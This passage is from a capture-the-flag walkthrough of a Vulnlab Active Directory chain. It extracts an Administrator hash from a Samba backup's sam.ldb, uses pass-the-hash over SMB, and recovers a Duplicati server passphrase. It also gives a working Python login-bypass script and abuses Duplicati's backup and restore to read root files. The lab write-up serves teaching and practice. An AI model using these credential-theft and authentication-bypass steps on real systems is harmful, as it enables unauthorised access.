etc/gdbcommands
etc/smb.conf
```

We can confirm it's a backup of the DC:

```shell-session
└─$ cat etc/smb.conf                             
# Global parameters
[global]
    dns forwarder = 127.0.0.53
    netbios name = DC
    realm = UNINTENDED.VL
    server role = active directory domain controller
    workgroup = UNINTENDED
    idmap_ldb:use rfc2307 = yes

[sysvol]
    path = /var/lib/samba/sysvol
    read only = No

[netlogon]
    path = /var/lib/samba/sysvol/unintended.vl/scripts
    read only = No
[home]
        comment = Home Directories
        browseable = yes
        read only = no
        create mask = 0700
        directory mask = 0700
        path = /home/%U@unintended.vl
        valid users = administrator, cartor
```

## Extracting Administrator's hash

The `private/sam.ldb` file seems interesting as we might be able to extract hashes from it.

By searching `ad linux backup ldb` we can find [the documentation](https://wiki.samba.org/index.php/Back_up_and_Restoring_a_Samba_AD_DC) explaining how Samba backup works.

By searching `sam ldb hash extract` we can also find a few resources that explain how to read the `sam.ldb` file:

- <https://samba.tranquil.it/doc/en/samba_fundamentals/about_password_hash.html>
- <https://samba.samba.narkive.com/HDAsLjU3/being-able-to-read-password-hashes>
- <https://wiki.samba.org/index.php/LDB>

![](/assets/vulnlab/chains/unintended/img/19.png)

`ldbsearch` has almost identical syntax to `ldapsearch`, and we can use it to query the local `sam.ldb` file.

First make sure it's installed:

```shell-session
└─$ sudo apt install ldb-tools
```

Let's extract Administrator's hash:

```shell-session
└─$ ldbsearch -H sam.ldb '(samaccountname=Administrator)' 'unicodepwd'            
# record 1
dn: CN=Administrator,CN=Users,DC=unintended,DC=vl
unicodePwd:: Nv4<...>4ow==

# Referral
ref: ldap:///CN=Configuration,DC=unintended,DC=vl

# Referral
ref: ldap:///DC=DomainDnsZones,DC=unintended,DC=vl

# Referral
ref: ldap:///DC=ForestDnsZones,DC=unintended,DC=vl

# returned 4 records
# 1 entries
# 3 referrals
```

```shell-session
└─$ echo 'Nv4<...>4ow==' | base64 -d | xxd -p
36fe<...>f8a3
```

It doesn't crack with `rockyou.txt`:

```shell-session
└─$ hashcat -a0 -m1000 36fe<...>f8a3 /usr/share/wordlists/rockyou.txt
```

However we can use pass-the-hash over SMB:

```shell-session
└─$ nxc smb dc -u Administrator -H 36fe<...>f8a3         
SMB         10.10.156.133   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.10.156.133   445    DC               [+] unintended.vl\Administrator:36fe<...>f8a3 (Pwn3d!)
```

We can read and write to our home directory:

```shell-session
└─$ nxc smb dc -u Administrator -H 36fe<...>f8a3 --shares
SMB         10.10.143.229   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.10.143.229   445    DC               [+] unintended.vl\Administrator:36fe<...>f8a3 (Pwn3d!)
SMB         10.10.143.229   445    DC               [*] Enumerated shares
SMB         10.10.143.229   445    DC               Share           Permissions     Remark
SMB         10.10.143.229   445    DC               -----           -----------     ------
SMB         10.10.143.229   445    DC               sysvol          READ,WRITE      
SMB         10.10.143.229   445    DC               netlogon        READ,WRITE      
SMB         10.10.143.229   445    DC               home            READ,WRITE      Home Directories
SMB         10.10.143.229   445    DC               IPC$                            IPC Service (Samba 4.15.13-Ubuntu)
```

By using `smbclient` with pass-the-hash we can read the root flag:

```shell-session
└─$ smbclient -U Administrator --password=36fe<...>f8a3 --pw-nt-hash //dc.unintended.vl/home
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar 30 09:37:08 2024
  ..                                  D        0  Sat Feb 24 21:13:16 2024
  .profile                            H      807  Sat Feb 24 21:13:16 2024
  .cache                             DH        0  Sat Feb 24 21:13:16 2024
  .bashrc                             H     3771  Sat Feb 24 21:13:16 2024
  .bash_logout                        H      220  Sat Feb 24 21:13:16 2024
  root.txt                            N       37  Sat Mar 30 09:37:08 2024

        10218772 blocks of size 1024. 6238764 blocks available
smb: \> get root.txt
getting file \root.txt of size 37 as root.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> exit
```

```shell-session
└─$ cat root.txt    
VL{...}
```

We can also read it with `nxc`:

```shell-session
└─$ nxc smb dc -u Administrator -H 36fe<...>f8a3 --spider home --pattern txt
SMB         10.10.143.229   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.10.143.229   445    DC               [+] unintended.vl\Administrator:36fe<...>f8a3 (Pwn3d!)
SMB         10.10.143.229   445    DC               [*] Started spidering
SMB         10.10.143.229   445    DC               [*] Spidering .
SMB         10.10.143.229   445    DC               //10.10.143.229/home/root.txt [lastm:'2024-03-30 09:37' size:37]
SMB         10.10.143.229   445    DC               [*] Done spidering (Completed in 0.23603272438049316)
```

```shell-session
└─$ nxc smb dc -u Administrator -H 36fe<...>f8a3 --share home --get-file root.txt root.txt
SMB         10.10.143.229   445    DC               [*] Windows 6.1 Build 0 x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:False)
SMB         10.10.143.229   445    DC               [+] unintended.vl\Administrator:36fe<...>f8a3 (Pwn3d!)
SMB         10.10.143.229   445    DC               [*] Copying "root.txt" to "root.txt"
SMB         10.10.143.229   445    DC               [+] File "root.txt" was downloaded to "root.txt"
```

```shell-session
└─$ cat root.txt
VL{...}
```

## (Bonus) Root on WEB

There's a third user flag that involves getting root on WEB (target 2) and that I didn't get by myself at the time. Thanks to the Discord's master channel I was able to understand and reproduce other people's method. It consists of extracting the Duplicati server passphrase from a backup, logging in to the web interface and creating a malicious backup and restore. I will show the detailed process here.

### Extracting the Duplicati server passphrase

First transfer the Duplicati backup we found on target 3 to our attack host:

```shell-session
abbie@unintended.vl@backup:~$ docker exec -it scripts_ftp_1 bash
root@ftp:/ftp# 
```

```shell-session
root@ftp:/ftp/volumes# ls docker_src/
duplicati-20240125T071045Z.dlist.zip            duplicati-ba27818c8bd7a4ea6a506fde8314c48d1.dblock.zip  duplicati-ie324293d766446ddbe27823f52e30d4c.dindex.zip
duplicati-b71dd219377964328aa2c79f4bc7354a5.dblock.zip  duplicati-i48680ba57a084652a109d584aebc63a9.dindex.zip
duplicati-b9d86c254096f4531b0be8e536a59ff07.dblock.zip  duplicati-i570def036a8d475c9ec47b861bee206a.dindex.zip
```

```shell-session
root@ftp:/ftp/volumes# tar -zcf docker_src.tar.gz docker_src/
```

```shell-session
abbie@unintended.vl@backup:~$ docker cp scripts_ftp_1:/ftp/volumes/docker_src.tar.gz .
Successfully copied 142MB to /home/abbie@unintended.vl/.
```

```shell-session
└─$ sshpass -p <ABBIE_PASS> scp abbie@unintended.vl@backup.unintended.vl:~/docker_src.tar.gz .
```

```shell-session
└─$ tar -zxf docker_src.tar.gz && rm docker_src.tar.gz
```

We can use [this script](https://github.com/duplicati/duplicati/tree/master/Tools/Commandline/RestoreFromPython) to restore the backup from Linux without having to install Duplicati.

```shell-session
└─$ wget https://github.com/duplicati/duplicati/raw/master/Tools/Commandline/RestoreFromPython/ijson.py
```

```shell-session
└─$ wget https://github.com/duplicati/duplicati/raw/master/Tools/Commandline/RestoreFromPython/pyaescrypt.py
```

```shell-session
└─$ wget https://github.com/duplicati/duplicati/raw/master/Tools/Commandline/RestoreFromPython/restore_from_python.py
```

```shell-session
└─$ mkdir restore
```

```shell-session
└─$ python3 restore_from_python.py
Welcome to Python Duplicati recovery.
Please type the full path to a directory with Duplicati's .aes or .zip files:./docker_src
Please type * to restore all files, or a pattern like /path/to/files/* to restore the files in a certain directory)*
Please enter the path to an empty destination directory:restore
...
```

There will be a lot of errors and it will take a while but the files will be restored correctly.

```shell-session
└─$ ls restore/source/root/scripts/
apache  docker-compose.yml  duplicati  gitea  mattermost  mysql  web
```

We find the database of the Duplicati server:

```shell-session
└─$ tree restore/source/root/scripts/duplicati                      
restore/source/root/scripts/duplicati
└── config
    ├── control_dir_v2
    │   └── lock_v2
    ├── Duplicati-server.sqlite
    ├── IRFTMLEYVT.sqlite
    └── IRFTMLEYVT.sqlite-journal

3 directories, 4 files
```

In the database we find some interesting entries like the `server-passphrase`.

```shell-session
└─$ sqlite3 restore/source/root/scripts/duplicati/config/Duplicati-server.sqlite
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
Backup        Log           Option        TempFile
ErrorLog      Metadata      Schedule      UIStorage
Filter        Notification  Source        Version
sqlite> select * from Option;
-2||startup-delay|0s
-2||max-download-speed|
-2||max-upload-speed|
-2||thread-priority|
-2||last-webserver-port|8200
-2||is-first-run|
-2||server-port-changed|True
-2||server-passphrase|ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk=
-2||server-passphrase-salt|j+7JQsuO7aggNAESQRkCBJd8dwdUE6A9QLTKXM3LB7w=
-2||server-passphrase-trayicon|4f760941-ce8f-4e03-b427-a92319d6d763
-2||server-passphrase-trayicon-hash|VHwBLiNdg/D545Utf8j67DSvqTvBmhpJIWzWmJCiV3o=
-2||last-update-check|638417625259706730
-2||update-check-interval|
-2||update-check-latest|
-2||unacked-error|
-2||unacked-warning|
-2||server-listen-interface|any
-2||server-ssl-certificate|
-2||has-fixed-invalid-backup-id|True
-2||update-channel|
-2||usage-reporter-level|
-2||has-asked-for-password-protection|true
-2||disable-tray-icon-login|false
-2||allowed-hostnames|*
1||encryption-module|
1||compression-module|zip
1||dblock-size|50mb
1||--no-encryption|true
1||retention-policy|1W:1D,4W:1W,12M:1M
sqlite> .quit
```

### Login to Duplicati

It turns out that we can login to the web interface by knowing the `server-passphrase`. There's an [article](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) published just after the chain's release that explains the attack. I highly recommend to read it first.

Let's try to understand the attack in more detail and why it works.

Using Burp Suite we can inspect requests sent when we try to login at <http://web.unintended.vl:8200/login.html> with any password.

First it gets a nonce from the server:

```
POST /login.cgi HTTP/1.1
Host: web.unintended.vl:8200
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 11
Origin: http://web.unintended.vl:8200
DNT: 1
Connection: close
Referer: http://web.unintended.vl:8200/login.html
Cookie: xsrf-token=uVr84ltXrj1xJ8shYnhZUF41%2B%2BydyzIUqXPLqvbZFO0%3D

get-nonce=1

HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate, max-age=0
Date: Thu, 02 May 2024 01:01:18 GMT
Content-Length: 140
Content-Type: application/json
Server: Tiny WebServer
Connection: close
Set-Cookie: session-nonce=2ZsSuaEaB77wEMO878o2K5t%2BE1n4R5JE0DgQ0scpnlE%3D; expires=Thu, 02 May 2024 01:11:18 GMT;path=/; 

﻿{
  "Status": "OK",
  "Nonce": "2ZsSuaEaB77wEMO878o2K5t+E1n4R5JE0DgQ0scpnlE=",
  "Salt": "j+7JQsuO7aggNAESQRkCBJd8dwdUE6A9QLTKXM3LB7w="
}
```

Then the `password` is likely generated and sent based on the nonce and the value we entered in the form:

```
POST /login.cgi HTTP/1.1
Host: web.unintended.vl:8200
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 57
Origin: http://web.unintended.vl:8200
DNT: 1
Connection: close
Referer: http://web.unintended.vl:8200/login.html
Cookie: xsrf-token=uVr84ltXrj1xJ8shYnhZUF41%2B%2BydyzIUqXPLqvbZFO0%3D; session-nonce=2ZsSuaEaB77wEMO878o2K5t%2BE1n4R5JE0DgQ0scpnlE%3D

password=tr3sWKfzgne4V7zlm43NHYmq%2BwiKhJSBbijmNkMsH4A%3D

HTTP/1.1 401 Unauthorized
Date: Thu, 02 May 2024 01:01:19 GMT
Content-Length: 0
Content-Type: application/json
Server: Tiny WebServer
Connection: close
```

This is how the `password` sent to `login.cgi` is actually generated:

<https://github.com/duplicati/duplicati/blob/67c1213a98e9f98659f3d4b78ded82b80ddab8bb/Duplicati/Server/webroot/login/login.js>

```cs
// First we grab the nonce and salt
$.ajax({
	url: './login.cgi',
	type: 'POST',
	dataType: 'json',
	data: {'get-nonce': 1}
})
.done(function(data) {
	var saltedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Utf8.parse($('#login-password').val()) + CryptoJS.enc.Base64.parse(data.Salt)));

	var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);

	$.ajax({
		url: './login.cgi',
		type: 'POST',
		dataType: 'json',
		data: {'password': noncedpwd }
	})
```

First `saltedpwd` is the SHA256 hash of the password entered by the user concatenated with the salt. Then `noncedpwd` is the SHA256 hash of the nonce concatenated with `saltedpwd`, which is then sent as the `password` parameter to `login.cgi`.

Next, this is where `server-passphrase` is used:

<https://github.com/duplicati/duplicati/blob/e927e7230dc5806990614235dca2d64073fd43aa/Duplicati.Library.RestAPI/Database/ServerSettings.cs#L39>

```cs
public const string SERVER_PASSPHRASE = "server-passphrase";
```

<https://github.com/duplicati/duplicati/blob/67c1213a98e9f98659f3d4b78ded82b80ddab8bb/Duplicati.Library.RestAPI/Database/ServerSettings.cs>

```cs
public string WebserverPassword
{
	get 
	{
		return settings[CONST.SERVER_PASSPHRASE];
	}
}
...
public void SetWebserverPassword(string password)
{
	if (string.IsNullOrWhiteSpace(password))
	{
		lock(databaseConnection.m_lock)
		{
			settings[CONST.SERVER_PASSPHRASE] = "";
			settings[CONST.SERVER_PASSPHRASE_SALT] = "";
		}
	}
	else
	{
		var prng = RandomNumberGenerator.Create();
		var buf = new byte[32];
		prng.GetBytes(buf);
		var salt = Convert.ToBase64String(buf);

		var sha256 = System.Security.Cryptography.SHA256.Create();
		var str = System.Text.Encoding.UTF8.GetBytes(password);

		sha256.TransformBlock(str, 0, str.Length, str, 0);
		sha256.TransformFinalBlock(buf, 0, buf.Length);
		var pwd = Convert.ToBase64String(sha256.Hash);

		lock(databaseConnection.m_lock)
		{
			settings[CONST.SERVER_PASSPHRASE] = pwd;
			settings[CONST.SERVER_PASSPHRASE_SALT] = salt;
		}
	}

	SaveSettings();
}
```

`server-passphrase` is the SHA256 hash of the plaintext password concatenated with `server-passphrase-salt`. This matches the `saltedpwd` variable in `login.js`, with the exception that `saltedpwd` is in hex whereas `server-passphrase` is in Base64.

Now let's see how `WebserverPassword` (i.e. `server-passphrase`) is used:

<https://github.com/duplicati/duplicati/blob/67c1213a98e9f98659f3d4b78ded82b80ddab8bb/Duplicati.Library.RestAPI/WebServer/AuthenticationHandler.cs>

```cs
if (input["get-nonce"] != null && !string.IsNullOrWhiteSpace(input["get-nonce"].Value))
{
	if (m_activeNonces.Count > 50)
	{
		response.Status = System.Net.HttpStatusCode.ServiceUnavailable;
		response.Reason = "Too many active login attempts";
		return true;
	}

	var password = FIXMEGlobal.DataConnection.ApplicationSettings.WebserverPassword;

	if (request.Headers[TRAYICONPASSWORDSOURCE_HEADER] == "database")
		password = FIXMEGlobal.DataConnection.ApplicationSettings.WebserverPasswordTrayIconHash;
	
	var buf = new byte[32];
	var expires = DateTime.UtcNow.AddMinutes(AUTH_TIMEOUT_MINUTES);
	m_prng.GetBytes(buf);
	var nonce = Convert.ToBase64String(buf);

	var sha256 = System.Security.Cryptography.SHA256.Create();
	sha256.TransformBlock(buf, 0, buf.Length, buf, 0);
	buf = Convert.FromBase64String(password);
	sha256.TransformFinalBlock(buf, 0, buf.Length);
	var pwd = Convert.ToBase64String(sha256.Hash);

	m_activeNonces.AddOrUpdate(nonce, key => new Tuple<DateTime, string>(expires, pwd), (key, existingValue) =>
	{
		// Simulate the original behavior => if the nonce, against all odds, is already used
		// we throw an ArgumentException
		throw new ArgumentException("An element with the same key already exists in the dictionary.");
	});

	response.Cookies.Add(new HttpServer.ResponseCookie(NONCE_COOKIE_NAME, nonce, expires));
	using(var bw = new BodyWriter(response, request))
	{
		bw.OutputOK(new {
			Status = "OK",
			Nonce = nonce,
			Salt = FIXMEGlobal.DataConnection.ApplicationSettings.WebserverPasswordSalt
		});
	}
	return true;
}
else
{
	if (input["password"] != null && !string.IsNullOrWhiteSpace(input["password"].Value))
	{
		var nonce_el = request.Cookies[NONCE_COOKIE_NAME] ?? request.Cookies[Library.Utility.Uri.UrlEncode(NONCE_COOKIE_NAME)];
		var nonce = nonce_el == null || string.IsNullOrWhiteSpace(nonce_el.Value) ? "" : nonce_el.Value;
		var urldecoded = nonce == null ? "" : Duplicati.Library.Utility.Uri.UrlDecode(nonce);
		if (m_activeNonces.ContainsKey(urldecoded))
			nonce = urldecoded;

		if (!m_activeNonces.ContainsKey(nonce))
		{
			response.Status = System.Net.HttpStatusCode.Unauthorized;
			response.Reason = "Unauthorized";
			response.ContentType = "application/json";
			return true;
		}

		var pwd = m_activeNonces[nonce].Item2;

		// Remove the nonce
		m_activeNonces.TryRemove(nonce, out _);

		if (pwd != input["password"].Value)
		{
			response.Status = System.Net.HttpStatusCode.Unauthorized;
			response.Reason = "Unauthorized";
			response.ContentType = "application/json";
			return true;
		}
```

We can see that the `password` (i.e. `noncedpwd`) sent to `login.cgi` is compared with the SHA256 hash of a randomly generated nonce concatenated with `WebserverPassword` (i.e. `server-passphrase`).

This means that knowing `server-passphrase`, we can easily compute the correct `noncedpwd` to be able to login.

We need to send a first request to `login.cgi` to get a nonce, then send a second request with the `password` parameter set as the SHA256 hash in Base64 of the nonce concatenated with `server-passphrase`.

Here is a script to automate the attack, `duplicati-login.py`:

```python
import requests
import base64
import hashlib

server_passphrase = 'ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk='

s = requests.Session()

s.get('http://web.unintended.vl:8200/login.html')

r = s.post('http://web.unintended.vl:8200/login.cgi', data = {
    'get-nonce': 1
}).json()
nonce = r['Nonce']

saltedpwd_bin = base64.b64decode(server_passphrase)
noncedpwd = base64.b64encode(hashlib.sha256(base64.b64decode(nonce) + saltedpwd_bin).digest()).decode()

r = s.post('http://web.unintended.vl:8200/login.cgi', data = {
    'password': noncedpwd
})

print(f'Status code: {r.status_code}')
print(f'Cookies: {s.cookies}')
```

```shell-session
└─$ python3 duplicati-login.py
Status code: 200
Cookies: <RequestsCookieJar[<Cookie xsrf-token=p4ORaHNTOvntwOf79tH1o%2Fq6SVaSupLvNmQiSN4hIs4%3D for web.unintended.vl/>, <Cookie session-nonce=6Q46SzvPaU%2BVeK37dOVnWp%2Fw8k8NJmVg6u0TqVqq9D8%3D for web.unintended.vl/>, <Cookie session-auth=QsSMl8sEoSVHVJgXCz0iLKUGtBqDDBe2kBCQyAYVBwI for web.unintended.vl/>]>
```

At <http://web.unintended.vl:8200/login.html> we now add or replace the cookie values to what the script gave us (make sure the path is set to `/`).

![](/assets/vulnlab/chains/unintended/img/20.png)

After navigating to <http://web.unintended.vl:8200/> again, we will successfully login!

![](/assets/vulnlab/chains/unintended/img/21.png)

### Read the flag with backup and restore

Let's try to add a new backup:

![](/assets/vulnlab/chains/unintended/img/22.png)

![](/assets/vulnlab/chains/unintended/img/23.png)

We notice that the root filesystem of the host is mounted at `/source` in the Duplicati container, allowing us to backup any files on the host to any location:

![](/assets/vulnlab/chains/unintended/img/24.png)

Let's backup `/source/root/flag.txt` to `/source/tmp/flag`:

![](/assets/vulnlab/chains/unintended/img/25.png)

![](/assets/vulnlab/chains/unintended/img/26.png)

Leave default settings for *Schedule* and *Options*. 

Click on *Run now* for the newly added backup:

![](/assets/vulnlab/chains/unintended/img/27.png)

After the backup runs, we can check the created files in a SSH session on WEB as juan:

```shell-session
juan@unintended.vl@web:~$ ls /tmp/flag
duplicati-20240502T025339Z.dlist.zip  duplicati-ba1abdf89a9af488ebe1b800f48517ff7.dblock.zip  duplicati-i15ebd0d15d644e5d8e6e1212b840cc72.dindex.zip
```

Now click on *Restore files...*:

![](/assets/vulnlab/chains/unintended/img/28.png)

Restore the files (the flag) to `/source/tmp/flag`:

![](/assets/vulnlab/chains/unintended/img/29.png)

![](/assets/vulnlab/chains/unintended/img/30.png)

![](/assets/vulnlab/chains/unintended/img/31.png)

After the restore, we can read the flag:

```shell-session
juan@unintended.vl@web:~$ ls /tmp/flag
duplicati-20240502T025339Z.dlist.zip  duplicati-ba1abdf89a9af488ebe1b800f48517ff7.dblock.zip  duplicati-i15ebd0d15d644e5d8e6e1212b840cc72.dindex.zip  flag.txt
```

```shell-session
juan@unintended.vl@web:~$ cat /tmp/flag/flag.txt
VL{...}
```
